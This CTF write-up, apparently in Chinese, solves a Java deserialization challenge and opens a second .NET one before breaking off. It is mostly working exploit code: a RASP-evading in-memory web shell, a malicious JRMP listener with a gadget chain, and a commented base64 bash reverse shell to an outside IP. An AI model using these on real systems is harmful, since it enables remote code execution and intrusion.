# WEB
## 题目：NoCommonCollections
解题步骤

本题考察点是一个反序列化中比较冷门的利用链，实战中有比较大的意义，但是经常被忽视。

题目代码很简短

```java
package com.nocc.ctf;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class Main {

    public static void main(String[] args) throws IOException {
        int port = 8081;
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/", new MyHandler());
        server.setExecutor(null); // 使用默认的 executor
        server.start();

        System.out.println("Server is listening on port " + port);
    }

    static class MyHandler implements HttpHandler {
        @Override
        public void handle(HttpExchange exchange) throws IOException {
            try {
                InputStream requestBody = exchange.getRequestBody();
                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                int nRead;
                byte[] data = new byte[1024];
                while ((nRead = requestBody.read(data, 0, data.length)) != -1) {
                    buffer.write(data, 0, nRead);
                }
                buffer.flush();
                String base64Param = buffer.toString();
                SerializeUtil.base64deserial(base64Param);
                String response = "Data received successfully";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
            catch (Exception e){
                String response = "Error";
                exchange.sendResponseHeaders(200, response.length());
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        }
    }
}
```



一个HttpServer起的服务，入口就是反序列化，黑名单如下

```java
package com.nocc.ctf;

import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.HashSet;
import java.util.Set;

public class SafeObjectInputStream extends ObjectInputStream {
    private static final Set<String> BLACKLIST = new HashSet();

    public SafeObjectInputStream(InputStream is) throws Exception {
        super(is);
    }

    protected Class<?> resolveClass(ObjectStreamClass input) throws IOException, ClassNotFoundException {
        if (input.getName().contains("org.apache.commons.collections")) {
            throw new SecurityException("Hacker!!");
        } else {
            return super.resolveClass(input);
        }
    }
}
```



比较传统的一些过滤，题目只给了CC依赖没有给其他的东西，但是cc下的类又被黑名单过滤了，这种情况下由于没法触发getter，你不能使用SignObject二次反序列化，这里就该使用YsoSerial的JRMP服务去攻击了。



但是这一题还有个点位就是有个Rasp Hook了Runtime和ProcessBuilder方法



因此这一题我们还需要反射调用native的forandexec方法去命令执行，并且需要自己实现一个JRMPListner



```java
package com.boogipop.Solutions;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import sun.misc.Unsafe;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class HttpMemShell extends AbstractTranslet implements HttpHandler {
    @Override
    public void handle(HttpExchange httpExchange) throws IOException {
        String query = httpExchange.getRequestURI().getQuery();
        String[] split = query.split("=");
        String response = "SUCCESS"+"\n";
        if (split[0].equals("shell")) {
            String cmd = split[1];
            InputStream inputStream = null;
            try {
                inputStream = execCmd(cmd);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            byte[] bytes = new byte[1024];
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            int flag=-1;
            while((flag=inputStream.read(bytes))!=-1){
                byteArrayOutputStream.write(bytes,0,flag);
            }
            response += byteArrayOutputStream.toString();
            byteArrayOutputStream.close();
        }
        httpExchange.sendResponseHeaders(200,response.length());
        OutputStream outputStream = httpExchange.getResponseBody();
        outputStream.write(response.getBytes());
        outputStream.close();
    }
    public HttpMemShell(){ //public和default的区别 public对所有类可见;default对同一个包内可见;templatlmpl默认实例化使用public memshell()
        try{
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field threadsFeld = threadGroup.getClass().getDeclaredField("threads");
            threadsFeld.setAccessible(true);
            Thread[] threads = (Thread[])threadsFeld.get(threadGroup);
            Thread thread = threads[1];

            Field targetField = thread.getClass().getDeclaredField("target");
            targetField.setAccessible(true);
            Object object = targetField.get(thread);

            Field this$0Field = object.getClass().getDeclaredField("this$0");
            this$0Field.setAccessible(true);
            object = this$0Field.get(object);

            Field contextsField = object.getClass().getDeclaredField("contexts");
            contextsField.setAccessible(true);
            object = contextsField.get(object);

            Field listField = object.getClass().getDeclaredField("list");
            listField.setAccessible(true);
            java.util.LinkedList linkedList = (java.util.LinkedList)listField.get(object);
            object = linkedList.get(0);

            Field handlerField = object.getClass().getDeclaredField("handler");
            handlerField.setAccessible(true);
            handlerField.set(object,this);
        }catch(Exception exception){
        }
    }

    public static InputStream execCmd(String cmd) throws Exception{
            String[] command=cmd.split(" ");
            Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
            theUnsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) theUnsafeField.get(null);

            Class processClass = null;

            try {
                processClass = Class.forName("java.lang.UNIXProcess");
            } catch (ClassNotFoundException e) {
                processClass = Class.forName("java.lang.ProcessImpl");
            }
            Object processObject = unsafe.allocateInstance(processClass);
            byte[][] args = new byte[command.length - 1][];
            int      size = args.length; // For added NUL bytes

            for (int i = 0; i < args.length; i++) {
                args[i] = command[i + 1].getBytes();
                size += args[i].length;
            }

            byte[] argBlock = new byte[size];
            int    i        = 0;

            for (byte[] arg : args) {
                System.arraycopy(arg, 0, argBlock, i, arg.length);
                i += arg.length + 1;
                // No need to write NUL bytes explicitly
            }
            int[] envc                 = new int[1];
            int[] std_fds              = new int[]{-1, -1, -1};
            Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
            Field helperpathField      = processClass.getDeclaredField("helperpath");
            launchMechanismField.setAccessible(true);
            helperpathField.setAccessible(true);
            Object launchMechanismObject = launchMechanismField.get(processObject);
            byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);

            int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);

            Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                    int.class, byte[].class, byte[].class, byte[].class, int.class,
                    byte[].class, int.class, byte[].class, int[].class, boolean.class
            });

            forkMethod.setAccessible(true);// 设置访问权限

            int pid = (int) forkMethod.invoke(processObject, new Object[]{
                    ordinal + 1, helperpathObject, toCString(command[0]), argBlock, args.length,
                    null, envc[0], null, std_fds, false
            });

            // 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流
            Method initStreamsMethod = processClass.getDeclaredMethod("initStreams", int[].class);
            initStreamsMethod.setAccessible(true);
            initStreamsMethod.invoke(processObject, std_fds);

            // 获取本地执行结果的输入流
            Method getInputStreamMethod = processClass.getMethod("getInputStream");
            getInputStreamMethod.setAccessible(true);
            InputStream in = (InputStream) getInputStreamMethod.invoke(processObject);
            return in;
        }
    static byte[] toCString(String s) {
        if (s == null)
            return null;
        byte[] bytes  = s.getBytes();
        byte[] result = new byte[bytes.length + 1];
        System.arraycopy(bytes, 0,
                result, 0,
                bytes.length);
        result[result.length - 1] = (byte) 0;
        return result;
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```



这里直接打了个内存马，然后自己实现一个JRMPListener



```java
package com.boogipop.Solutions;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.*;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import java.util.Arrays;

import javax.net.ServerSocketFactory;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import sun.rmi.transport.TransportConstants;

/**
 * Generic JRMP listener
 *
 * Opens up an JRMP listener that will deliver the specified payload to any
 * client connecting to it and making a call.
 *
 * @author mbechler
 *
 */
@SuppressWarnings ( {
        "restriction"
} )
public class JRMPListener implements Runnable {

    private int port;
    private Object payloadObject;
    private ServerSocket ss;
    private Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;
    private URL classpathUrl;


    public JRMPListener ( int port, Object payloadObject ) throws NumberFormatException, IOException {
        this.port = port;
        this.payloadObject = payloadObject;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }

    public JRMPListener (int port, String className, URL classpathUrl) throws IOException {
        this.port = port;
        this.payloadObject = makeDummyObject(className);
        this.classpathUrl = classpathUrl;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }


    public boolean waitFor ( int i ) {
        try {
            if ( this.hadConnection ) {
                return true;
            }
            System.err.println("Waiting for connection");
            synchronized ( this.waitLock ) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        }
        catch ( InterruptedException e ) {
            return false;
        }
    }


    /**
     *
     */
    public void close () {
        this.exit = true;
        try {
            this.ss.close();
        }
        catch ( IOException e ) {}
        synchronized ( this.waitLock ) {
            this.waitLock.notify();
        }
    }


    public static final void main ( final String[] args ) throws Exception {

        if ( args.length < 1 ) {
            System.err.println(JRMPListener.class.getName() + " <port>");
            System.exit(-1);
            return;
        }

        final Object payloadObject = CommonCollections3.getObject();

        try {
            int port = Integer.parseInt(args[ 0 ]);
            System.err.println("* Opening JRMP listener on " + port);
            JRMPListener c = new JRMPListener(port, payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }


    public void run () {
        try {
            Socket s = null;
            try {
                while ( !this.exit && ( s = this.ss.accept() ) != null ) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        DataInputStream in = new DataInputStream(bufIn);
                        int magic = in.readInt();

                        short version = in.readShort();
                        if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
                            s.close();
                            continue;
                        }

                        OutputStream sockOut = s.getOutputStream();
                        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                        DataOutputStream out = new DataOutputStream(bufOut);

                        byte protocol = in.readByte();
                        switch ( protocol ) {
                            case TransportConstants.StreamProtocol:
                                out.writeByte(TransportConstants.ProtocolAck);
                                if ( remote.getHostName() != null ) {
                                    out.writeUTF(remote.getHostName());
                                } else {
                                    out.writeUTF(remote.getAddress().toString());
                                }
                                out.writeInt(remote.getPort());
                                out.flush();
                                in.readUTF();
                                in.readInt();
                            case TransportConstants.SingleOpProtocol:
                                doMessage(s, in, out, this.payloadObject);
                                break;
                            default:
                            case TransportConstants.MultiplexProtocol:
                                System.err.println("Unsupported protocol");
                                s.close();
                                continue;
                        }

                        bufOut.flush();
                        out.flush();
                    }
                    catch ( InterruptedException e ) {
                        return;
                    }
                    catch ( Exception e ) {
                        e.printStackTrace(System.err);
                    }
                    finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            }
            finally {
                if ( s != null ) {
                    s.close();
                }
                if ( this.ss != null ) {
                    this.ss.close();
                }
            }

        }
        catch ( SocketException e ) {
            return;
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }


    private void doMessage ( Socket s, DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        System.err.println("Reading message...");

        int op = in.read();

        switch ( op ) {
            case TransportConstants.Call:
                // service incoming RMI call
                doCall(in, out, payload);
                break;

            case TransportConstants.Ping:
                // send ack for ping
                out.writeByte(TransportConstants.PingAck);
                break;

            case TransportConstants.DGCAck:
                UID u = UID.read(in);
                break;

            default:
                throw new IOException("unknown transport op " + op);
        }

        s.close();
    }


    private void doCall ( DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException {
                if ( "[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ( "java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        }
        catch ( java.io.IOException e ) {
            throw new MarshalException("unable to read objID", e);
        }


        if ( read.hashCode() == 2 ) {
            ois.readInt(); // method
            ois.readLong(); // hash
            System.err.println("Is DGC call for " + Arrays.toString((ObjID[])ois.readObject()));
        }

        System.err.println("Sending return with payload for obj " + read);

        out.writeByte(TransportConstants.Return);// transport op
        ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl);

        oos.writeByte(TransportConstants.ExceptionalReturn);
        new UID().write(oos);

        oos.writeObject(payload);

        oos.flush();
        out.flush();

        this.hadConnection = true;
        synchronized ( this.waitLock ) {
            this.waitLock.notifyAll();
        }
    }

    @SuppressWarnings({"deprecation"})
    protected static Object makeDummyObject (String className) {
        try {
            ClassLoader isolation = new ClassLoader() {};
            ClassPool cp = new ClassPool();
            cp.insertClassPath(new ClassClassPath(Dummy.class));
            CtClass clazz = cp.get(Dummy.class.getName());
            clazz.setName(className);
            return clazz.toClass(isolation).newInstance();
        }
        catch ( Exception e ) {
            e.printStackTrace();
            return new byte[0];
        }
    }
    static final class MarshalOutputStream extends ObjectOutputStream {
        private URL sendUrl;
        public MarshalOutputStream(OutputStream out, URL u) throws IOException
        {
            super(out);
            this.sendUrl = u;
        }
        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }
        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                String cb = "";
                for (URL u : us) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }
        /**
         * Serializes a location from which to load the specified class.
         */
        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }

    public static class Dummy implements Serializable {
        private static final long serialVersionUID = 1L;

    }
}
```



```java
package com.boogipop.Solutions;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections3 {
    public static Object getObject() throws Exception {
        Templates templatesImpl = SerializeUtils.getTemplate();
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //CC1后半
        HashMap<Object,Object> map=new HashMap<>();
        Map<Object,Object> lazymap = LazyMap.decorate(map,new ConstantTransformer(1)); //随便改成什么Transformer
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap, "aaa");
        HashMap<Object, Object> hashMap=new HashMap<>();
        hashMap.put(tiedMapEntry,"bbb");
        map.remove("aaa");
        Field factory = LazyMap.class.getDeclaredField("factory");
        factory.setAccessible(true);
        factory.set(lazymap,chainedTransformer);
        return hashMap;
    }
}
```



```plain
package com.boogipop.Solutions;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.Serializer;
import com.caucho.hessian.io.SerializerFactory;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;
import sun.misc.Unsafe;
import sun.reflect.ReflectionFactory;

import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.*;

import javax.xml.transform.Templates;

public class SerializeUtils {
    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void LoadBcel(String code) throws Exception {
        new ClassLoader().loadClass(code).newInstance();
    }
    public static  String makeBcelStr(Class c) throws Exception{
        JavaClass javaClass= Repository.lookupClass(c);
        String code= Utility.encode(javaClass.getBytes(),true);
        code="$$BCEL$$"+code;
        return code;
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        if(field != null) {
            field.set(obj, value);
        }
    }
    public  static void setFinalFieldValue(final Object obj, final String fieldName, final Object value) throws Exception{
        final Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        Field modifersField = Field.class.getDeclaredField("modifiers");
        modifersField.setAccessible(true);
        modifersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
        if(field != null) {
            field.set(obj, value);
        }
    }
    public static void base64deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }
    public static String base64serial(Object o) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static Object createWithoutConstructor(String classname) throws Exception {
        return createWithoutConstructor(Class.forName(classname));
    }
    public static <T> T createWithoutConstructor(Class<T> classToInstantiate) throws Exception {
        return createWithConstructor(classToInstantiate, Object.class, new Class[0], new Object[0]);
    }
    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(filename));
        Object obj=ois.readObject();
        return obj;
    }
    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
        TreeMap<Object,Object> m = new TreeMap<>();
        setFieldValue(m, "size", 2);
        setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object node = nodeCons.newInstance(v1, new Object[0], null);
        Object right = nodeCons.newInstance(v2, new Object[0], node);
        setFieldValue(node, "right", right);
       setFieldValue(m, "root", node);

        TreeSet set = new TreeSet();
        setFieldValue(set, "m", m);
        return set;
    }
    public static Templates getTemplate() throws  Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get(HttpMemShell.class.getName());
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "boogipop");
        setFieldValue(templatesImpl, "_tfactory", null);
        return templatesImpl;
    }
    public static Templates getTemplate1(String body) throws  Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        //constructor.setBody("Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}\");");
        constructor.setBody(body);
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "boogipop");
        setFieldValue(templatesImpl, "_tfactory", null);
        return templatesImpl;
    }
    public static byte[] getFileBytes(String filepath)throws Exception{
        byte[] code= Files.readAllBytes(Paths.get(filepath));
        return code;
    }
    public static Unsafe getUnsafe() throws NoSuchFieldException, IllegalAccessException {
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        //私有属性可以访问
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        return unsafe;
    }
    public static Templates getTemplateByclass(String classpath) throws  Exception{
        byte[] code= Files.readAllBytes(Paths.get(classpath));
        byte[][] codes={code};
        Templates templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", codes);
        setFieldValue(templatesImpl, "_name", "boogipop");
        setFieldValue(templatesImpl, "_tfactory", null);
        return templatesImpl;
    }
    public static HashSet MakeHashSet(Object o) throws Exception{
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,o);
        return hashset;
    }
    public static void OverideJackson() throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.writeFile();
        ctClass.toClass();
    }
    public static void OverideWeblogicJackson() throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("weblogic.jdbc.sqlserver.externals.com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.writeFile();
        ctClass.toClass();
    }
    public static void OverideWeblogicJackson2() throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.getCtClass("weblogic.externals.com.fasterxml.jackson_2_12_0.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.writeFile();
        ctClass.toClass();
    }
    public static SignedObject getSignObject(Object o) throws  Exception{
        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        SignedObject signedObject = new SignedObject((Serializable) o,privateKey,signingEngine);
        return signedObject;
    }
    public static ByteArrayOutputStream HessianTostringSerial(Object o) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67); //hessian4
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(o);
        out.flushBuffer();
        return baos;
    }
    public static Object makeTreeSetWithXString(Object obj) throws Exception {
        Object rdnEntry1 = SerializeUtils.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        SerializeUtils.setFieldValue(rdnEntry1, "type", "ysomap");
        SerializeUtils.setFieldValue(rdnEntry1, "value", new XString("test"));

        Object rdnEntry2 = SerializeUtils.newInstance("javax.naming.ldap.Rdn$RdnEntry", null);
        SerializeUtils.setFieldValue(rdnEntry2, "type", "ysomap");
        SerializeUtils.setFieldValue(rdnEntry2, "value", obj);

        return SerializeUtils.makeTreeSet(rdnEntry2, rdnEntry1);
    }
    public static void HessianDeserial(ByteArrayOutputStream out) throws Exception{
        ByteArrayInputStream bais = new ByteArrayInputStream(out.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }
    public static String HessianSerial(Object o) throws Exception{
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output oos = new Hessian2Output(baos);
        SerializerFactory serializerFactory = oos.getSerializerFactory();
        oos.setSerializerFactory(serializerFactory);
        serializerFactory.setAllowNonSerializable(true);
        oos.writeObject(o);
        oos.close();
        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;
    }
    public static void HessianDeserial(String base64) throws Exception{
        byte[] base64decodedBytes = Base64.getDecoder().decode(base64);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        Hessian2Input ois = new Hessian2Input(bais);
        ois.readObject();
        ois.close();
    }
    public static Constructor<?> getFirstCtor(final String name) throws Exception {
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        return ctor;
    }
    public static Constructor<?> getConstructor(String classname, Class<?>[] paramTypes) throws ClassNotFoundException, NoSuchMethodException {
        Constructor<?> ctor = Class.forName(classname).getDeclaredConstructor(paramTypes);
        ctor.setAccessible(true);
        return ctor;
    }

    public static Object newInstance(String className, Object ... args) throws Exception {
        return getFirstCtor(className).newInstance(args);
    }

    public static Object newInstance(String classname, Class<?>[] paramTypes, Object... args) throws NoSuchMethodException, ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, InvocationTargetException {
        return getConstructor(classname, paramTypes).newInstance(args);
    }

    public static <T> T newInstance(Class<T> cls, Class<?>[] paramTypes, Object... args) throws NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        Constructor<?> ctor = cls.getDeclaredConstructor(paramTypes);
        ctor.setAccessible(true);
        return (T) ctor.newInstance(args);
    }
    //创建代理,面向单个接口
    public static <T> T createProxy (final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(java.lang.ClassLoader.getSystemClassLoader(), allIfaces, ih));
    }
    public static void deserTester(Object o) throws Exception {
        base64deserial(base64serial(o));
    }
}
```



一共四个java文件。最终生成了一个jar包放在了Exploit文件夹下。



首先在vps上开启我们的恶意JRMP Lisnter

```plain
java -jar exp.jar  7778
* Opening JRMP listener on 7778
```



随后再用JRMP Client去攻击

```plain
java -jar ysoserial-all.jar JRMPClient <vps>:7778|base64
```

最终可以看到内存马打入成功，如解题视频里那样。



最后访问



`url+/?shell=cat%20/this_is_flag`



就可以获取flag了

```plain
HTTP/1.1 200 OK
Date: Fri, 24 May 2024 14:16:03 GMT
Content-Length: 49

SUCCESS
DASCTF{e6d5457d4418b8c544ac677f4c114566}
```

## 题目：Ezdotnet
解题步骤

题目Index路由有一个比较明显的点位

```csharp
public IActionResult Index()
    {
        if (HttpContext.Request.Method==HttpMethods.Post)
        {
            var payload = HttpContext.Request.Form["base64str"];
            var myBinaryFormatter = new MyBinaryFormatter();
            myBinaryFormatter.Deserialize(payload);
        }

        return View();
    }
```



传入Base64字符串之后进行一个反序列化处理，用的是BinaryFormatter，逻辑如下

```csharp
